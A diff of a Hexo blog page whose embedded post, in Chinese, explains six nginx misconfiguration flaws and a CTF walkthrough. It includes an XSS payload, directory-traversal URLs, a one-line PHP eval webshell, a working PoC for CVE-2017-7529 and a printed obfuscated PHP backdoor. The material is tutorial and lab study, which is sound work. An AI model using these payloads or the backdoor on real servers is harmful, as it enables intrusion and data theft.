@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\nCRLF漏洞错误配置\n123location / &#123;       return 302 https://$host$uri;   &#125;\n\n请求头\n1GET /%0a%0d%0a%0d&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1\n\n响应头\n1234Location: https://14.28.29.24/&lt;script&gt;alert(1)&lt;/script&gt;\n\n没有弹窗，不知道为啥 按理来说应该能够弹窗的\n目录穿越Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。\n配置错误示例\n123location /files &#123;    alias /home/;&#125;\n\n正确配置\n123location /files/ &#123;    alias /home/;&#125;\n\n测试\n1http://vps_ip:port/files../\n\n这样就可以访问到根目录\n\nadd_headerNginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。\n1234567891011add_header Content-Security-Policy &quot;default-src &apos;self&apos;&quot;;add_header X-Frame-Options DENY;location = /test1 &#123;    rewrite ^(.*)$ /xss.html break;&#125;location = /test2 &#123;    add_header X-Content-Type-Options nosniff;    rewrite ^(.*)$ /xss.html break;&#125;\n\n但/test2的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效：\n测试\n请求头\n1GET /test2 HTTP/1.1\n\n响应头\n123Connection: closeETag: &quot;5d7eea55-92&quot;X-Content-Type-Options: nosniff\n\n\n解析漏洞这个漏洞与nginx php无关，是配置不当导致的\n先把主机上的nginx  stop\n正常情况\n1http://ip/uploadfiles/nginx.png\n\n看到一张图片\n解析php文件\n1http://ip/uploadfiles/nginx.png/.php\n\n这时nginx会把图片当作php文件解析\n文件名逻辑漏洞后台配置\n123456789location ~ \\.php$ &#123;   root           html;   include        fastcgi_params;   fastcgi_pass   php:9000;   fastcgi_index  index.php;   fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;   fastcgi_param  DOCUMENT_ROOT /var/www/html;&#125;\n\nnginx会把.php结尾的文件发给fastcgi解析，如果请求这样一个文件，1.gif%20%00.php(%00起到截断的作用) 这样也能够通过.php$的判断，但是进入location后，nginx却认为文件名是 1.gif%20 ，并设置为SCRIPT_FILENAME的值，发送给fastcgi，fastcgi就会把1.gif%20当作php文件解析\n测试1\neval.png\n123&lt;?phpeval($_POST[&apos;shell&apos;]);?&gt;\n\n先传一个以空格结尾的文件eval.png 上传的不需要截断，访问在截断\n访问eval.png[0x20][0x00].php\n\n测试2\n绕过本地登陆限制\n某些网站限制后台访问ip \n1234location /admin/ &#123;    allow 127.0.0.1;    deny all;&#125;\n\n我们可以请求如下URI：/test[0x20]/../admin/index.php，这个URI不会匹配上location后面的/admin/，也就绕过了其中的IP验证；但最后请求的是/test[0x20]/../admin/index.php文件，也就是/admin/index.php，成功访问到后台。（这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）\n越界读取缓存Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。\n12345678[root@vultr CVE-2017-7529]# python3 poc.py http://192.168.110.140:8080/--00000000000000000002Content-Type: text/html; charset=utf-8Content-Range: bytes -605-611/612SÉ™]b`RYûÆ™]r«\\me\"59526062-264\" KEY: http://127.0.0.1:8081/   //缓存文件\n\npoc.py\n123456789101112131415161718192021#!/usr/bin/env pythonimport sysimport requestsif len(sys.argv) &lt; 2:    print(\"%s url\" % (sys.argv[0]))    print(\"eg: python %s http://your-ip:8080/\" % (sys.argv[0]))    sys.exit()headers = &#123;    'User-Agent': \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\"&#125;offset = 605url = sys.argv[1]file_len = len(requests.get(url, headers=headers).content)n = file_len + offsetheaders['Range'] = \"bytes=-%d,-%d\" % (    n, 0x8000000000000000 - n)r = requests.get(url, headers=headers)print(r.text)\n\n一道ctf练手修改cookie中的islogin=1 登陆，再点击管理页面时，看到url变成了\n1admin/admin.php?file=index&amp;ext=php\n\n修改url 这里../被过滤\n1http://111.198.29.45:33136/admin/admin.php?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&amp;ext=conf\n\n拿到源码\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071server &#123;    listen 8080; ## listen for ipv4; this line is default and implied    listen [::]:8080; ## listen for ipv6    root /var/www/html;    index index.php index.html index.htm;    port_in_redirect off;    server_name _;    # Make site accessible from http://localhost/    #server_name localhost;    # If block for setting the time for the logfile    if ($time_iso8601 ~ \"^(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)\") &#123;       set $year $1;       set $month $2;       set $day $3;    &#125;    # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html    sendfile off;        set $http_x_forwarded_for_filt $http_x_forwarded_for;        if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) &#123;                set $http_x_forwarded_for_filt $1???;        &#125;    # Add stdout logging    access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;    error_log /var/log/nginx/error.log info;    location / &#123;        # First attempt to serve request as file, then        # as directory, then fall back to index.html        try_files $uri $uri/ /index.php?q=$uri&amp;$args;        server_tokens off;    &#125;    #error_page 404 /404.html;    # redirect server error pages to the static page /50x.html    #    error_page 500 502 503 504 /50x.html;    location = /50x.html &#123;        root /usr/share/nginx/html;    &#125;    location ~ \\.php$ &#123;        try_files $uri $uri/ /index.php?q=$uri&amp;$args;        fastcgi_split_path_info ^(.+\\.php)(/.+)$;        fastcgi_pass unix:/var/run/php/php5.6-fpm.sock;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        fastcgi_param SCRIPT_NAME $fastcgi_script_name;        fastcgi_index index.php;        include fastcgi_params;        fastcgi_param REMOTE_ADDR $http_x_forwarded_for;    &#125;    location ~ /\\. &#123;            log_not_found off;            deny all;    &#125;    location /web-img &#123;        alias /images/;        autoindex on;    &#125;    location ~* \\.(ini|docx|pcapng|doc)$ &#123;           deny all;      &#125;      include /var/www/nginx[.]conf;&#125;\n\n重点在这里\n1234location /web-img &#123;    alias /images/;    autoindex on;&#125;\n\nweb-img后面少了一个/  目录穿越\n访问\n1http://111.198.29.45:33136/web-img../\n\n跳转到了根目录，在/var/www/html目录下 找到了 hack.php.bak\n1234567891011121314151617&lt;?php$U='_/|U\",\"/-/|U\"),ar|Uray|U(\"/|U\",\"+\"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle';$q='s[|U$i]=\"\";$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui';$M='l=\"strtolower|U\";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$';$z='r=@$r[|U\"HTTP_R|UEFERER|U\"];$r|U|Ua=@$r[\"HTTP_A|U|UCCEPT_LAN|UGUAGE|U\"];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r';$k='?:;q=0.([\\\\|Ud]))?,|U?/\",$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=\"|Usubst|Ur\";|U|U$s';$o='|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r';$N='|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(\"/';$C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(\"|U&lt;$k&gt;$d&lt;/$k&gt;\"|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;';$j='$k|Uh=\"|U|U42f7\";$kf=\"e9ac\";fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U\"\";fo|Ur($i=0;$i&lt;';$R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion');$J='kf|U),|U0,3));$p=\"|U\";for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$';$x='r)|U;pa|Urse|U_str($u[\"qu|U|Uery\"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(\"/([\\\\|U|Uw])[|U\\\\w-]+|U(';$f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);$g=create_function('',$f);$g();?&gt;\n\n看样子像一个混淆了的小马\n参考链接\nhttps://vulhub.org/#/environments/nginx/CVE-2017-7529/\nhttps://www.freebuf.com/articles/terminal/140402.html\n","dateCreated":"2019-10-06T10:28:26+08:00","dateModified":"2020-02-26T13:43:35+08:00","datePublished":"2019-10-06T10:28:26+08:00","description":"","headline":"nginx漏洞6例","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/10/06/nginx漏洞6例/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/10/06/nginx漏洞6例/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\nCRLF漏洞错误配置\n123location / &#123;       return 302 https://$host$uri;   &#125;\n\n请求头\n1GET /%0a%0d%0a%0d&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1\n\n响应头\n1234Location: https://14.28.29.24/&lt;script&gt;alert(1)&lt;/script&gt;\n\n没有弹窗，不知道为啥 按理来说应该能够弹窗的\n目录穿越Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。\n配置错误示例\n123location /files &#123;    alias /home/;&#125;\n\n正确配置\n123location /files/ &#123;    alias /home/;&#125;\n\n测试\n1http://vps_ip:port/files../\n\n这样就可以访问到根目录\n\nadd_headerNginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。\n1234567891011add_header Content-Security-Policy &quot;default-src &apos;self&apos;&quot;;add_header X-Frame-Options DENY;location = /test1 &#123;    rewrite ^(.*)$ /xss.html break;&#125;location = /test2 &#123;    add_header X-Content-Type-Options nosniff;    rewrite ^(.*)$ /xss.html break;&#125;\n\n但/test2的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效：\n测试\n请求头\n1GET /test2 HTTP/1.1\n\n响应头\n123Connection: closeETag: &quot;5d7eea55-92&quot;X-Content-Type-Options: nosniff\n\n\n解析漏洞这个漏洞与nginx php无关，是配置不当导致的\n先把主机上的nginx  stop\n正常情况\n1http://ip/uploadfiles/nginx.png\n\n看到一张图片\n解析php文件\n1http://ip/uploadfiles/nginx.png/.php\n\n这时nginx会把图片当作php文件解析\n文件名逻辑漏洞后台配置\n123456789location ~ \\.php$ &#123;   root           html;   include        fastcgi_params;   fastcgi_pass   php:9000;   fastcgi_index  index.php;   fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;   fastcgi_param  DOCUMENT_ROOT /var/www/html;&#125;\n\nnginx会把.php结尾的文件发给fastcgi解析，如果请求这样一个文件，1.gif%20%00.php(%00起到截断的作用) 这样也能够通过.php$的判断，但是进入location后，nginx却认为文件名是 1.gif%20 ，并设置为SCRIPT_FILENAME的值，发送给fastcgi，fastcgi就会把1.gif%20当作php文件解析\n测试1\neval.png\n123&lt;?phpeval($_POST[&apos;shell&apos;]);?&gt;\n\n先传一个以空格结尾的文件eval.png 上传的不需要截断，访问在截断\n访问eval.png[0x20][0x00].php\n\n测试2\n绕过本地登陆限制\n某些网站限制后台访问ip \n1234location /admin/ &#123;    allow 127.0.0.1;    deny all;&#125;\n\n我们可以请求如下URI：/test[0x20]/../admin/index.php，这个URI不会匹配上location后面的/admin/，也就绕过了其中的IP验证；但最后请求的是/test[0x20]/../admin/index.php文件，也就是/admin/index.php，成功访问到后台。（这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）\n越界读取缓存Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。\n12345678[root@vultr CVE-2017-7529]# python3 poc.py http://192.168.110.140:8080/--00000000000000000002Content-Type: text/html; charset=utf-8Content-Range: bytes -605-611/612SÉ™]b`RYûÆ™]r«\\me\"59526062-264\" KEY: http://127.0.0.1:8081/   //缓存文件\n\npoc.py\n123456789101112131415161718192021#!/usr/bin/env pythonimport sysimport requestsif len(sys.argv) &lt; 2:    print(\"%s url\" % (sys.argv[0]))    print(\"eg: python %s http://your-ip:8080/\" % (sys.argv[0]))    sys.exit()headers = &#123;    'User-Agent': \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\"&#125;offset = 605url = sys.argv[1]file_len = len(requests.get(url, headers=headers).content)n = file_len + offsetheaders['Range'] = \"bytes=-%d,-%d\" % (    n, 0x8000000000000000 - n)r = requests.get(url, headers=headers)print(r.text)\n\n一道ctf练手修改cookie中的islogin=1 登陆，再点击管理页面时，看到url变成了\n1admin/admin.php?file=index&amp;ext=php\n\n修改url 这里../被过滤\n1http://111.198.29.45:33136/admin/admin.php?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&amp;ext=conf\n\n拿到源码\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071server &#123;    listen 8080; ## listen for ipv4; this line is default and implied    listen [::]:8080; ## listen for ipv6    root /var/www/html;    index index.php index.html index.htm;    port_in_redirect off;    server_name _;    # Make site accessible from http://localhost/    #server_name localhost;    # If block for setting the time for the logfile    if ($time_iso8601 ~ \"^(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)\") &#123;       set $year $1;       set $month $2;       set $day $3;    &#125;    # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html    sendfile off;        set $http_x_forwarded_for_filt $http_x_forwarded_for;        if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) &#123;                set $http_x_forwarded_for_filt $1???;        &#125;    # Add stdout logging    access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;    error_log /var/log/nginx/error.log info;    location / &#123;        # First attempt to serve request as file, then        # as directory, then fall back to index.html        try_files $uri $uri/ /index.php?q=$uri&amp;$args;        server_tokens off;    &#125;    #error_page 404 /404.html;    # redirect server error pages to the static page /50x.html    #    error_page 500 502 503 504 /50x.html;    location = /50x.html &#123;        root /usr/share/nginx/html;    &#125;    location ~ \\.php$ &#123;        try_files $uri $uri/ /index.php?q=$uri&amp;$args;        fastcgi_split_path_info ^(.+\\.php)(/.+)$;        fastcgi_pass unix:/var/run/php/php5.6-fpm.sock;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        fastcgi_param SCRIPT_NAME $fastcgi_script_name;        fastcgi_index index.php;        include fastcgi_params;        fastcgi_param REMOTE_ADDR $http_x_forwarded_for;    &#125;    location ~ /\\. &#123;            log_not_found off;            deny all;    &#125;    location /web-img &#123;        alias /images/;        autoindex on;    &#125;    location ~* \\.(ini|docx|pcapng|doc)$ &#123;           deny all;      &#125;      include /var/www/nginx[.]conf;&#125;\n\n重点在这里\n1234location /web-img &#123;    alias /images/;    autoindex on;&#125;\n\nweb-img后面少了一个/  目录穿越\n访问\n1http://111.198.29.45:33136/web-img../\n\n跳转到了根目录，在/var/www/html目录下 找到了 hack.php.bak\n1234567891011121314151617&lt;?php$U='_/|U\",\"/-/|U\"),ar|Uray|U(\"/|U\",\"+\"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle';$q='s[|U$i]=\"\";$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui';$M='l=\"strtolower|U\";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$';$z='r=@$r[|U\"HTTP_R|UEFERER|U\"];$r|U|Ua=@$r[\"HTTP_A|U|UCCEPT_LAN|UGUAGE|U\"];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r';$k='?:;q=0.([\\\\|Ud]))?,|U?/\",$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=\"|Usubst|Ur\";|U|U$s';$o='|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r';$N='|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(\"/';$C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(\"|U&lt;$k&gt;$d&lt;/$k&gt;\"|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;';$j='$k|Uh=\"|U|U42f7\";$kf=\"e9ac\";fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U\"\";fo|Ur($i=0;$i&lt;';$R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion');$J='kf|U),|U0,3));$p=\"|U\";for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$';$x='r)|U;pa|Urse|U_str($u[\"qu|U|Uery\"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(\"/([\\\\|U|Uw])[|U\\\\w-]+|U(';$f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);$g=create_function('',$f);$g();?&gt;\n\n看样子像一个混淆了的小马\n参考链接\nhttps://vulhub.org/#/environments/nginx/CVE-2017-7529/\nhttps://www.freebuf.com/articles/terminal/140402.html\n","dateCreated":"2019-10-06T10:28:26+08:00","dateModified":"2020-02-26T13:43:35+08:00","datePublished":"2019-10-06T10:28:26+08:00","description":"","headline":"nginx漏洞6例","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/10/06/nginx漏洞6例/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/10/06/nginx漏洞6例/"}</script>
     <meta name="description" content="CRLF漏洞错误配置 123location / &amp;#123;       return 302 https://$host$uri;   &amp;#125;  请求头 1GET /%0a%0d%0a%0d&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; HTTP/1.1  响应头 1234Location: https://14.28.29.24/&amp;lt;script&amp;g">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="nginx漏洞6例">
-<meta property="og:url" content="http://yoursite.com/2019/10/06/nginx漏洞6例/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/10/06/nginx漏洞6例/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="CRLF漏洞错误配置 123location / &amp;#123;       return 302 https://$host$uri;   &amp;#125;  请求头 1GET /%0a%0d%0a%0d&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; HTTP/1.1  响应头 1234Location: https://14.28.29.24/&amp;lt;script&amp;g">
 <meta property="og:locale" content="zh-cn">
@@ -346,7 +346,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -357,7 +357,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -370,7 +370,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -383,7 +383,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -396,7 +396,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -461,7 +461,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -472,7 +472,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -485,7 +485,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -498,7 +498,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -511,7 +511,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -532,7 +532,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -545,7 +545,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -558,7 +558,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/10/06/nginx漏洞6例/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/06/nginx漏洞6例/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
